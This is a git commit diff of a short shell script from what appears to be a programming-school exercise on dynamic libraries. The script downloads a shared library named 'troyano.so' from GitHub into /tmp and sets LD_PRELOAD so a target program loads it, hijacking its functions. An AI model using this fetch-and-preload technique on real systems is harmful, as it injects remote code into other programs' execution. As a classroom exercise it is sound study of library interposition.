de3fb47c2f71ea18f25063ff08e7a5c1db2fb837
DiegoSusviela <dieguitosus@hotmail.com>
2021-05-03 18:25:45 -0300

    now using -O instead of -P in wget scrpit

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/DiegoSusviela/holbertonschool-low_level_programming/blob/main/0x18-dynamic_libraries/troyano.so
+wget -O /tmp/troyano.so https://github.com/DiegoSusviela/holbertonschool-low_level_programming/blob/main/0x18-dynamic_libraries/troyano.so
 export LD_PRELOAD=/tmp/troyano.so
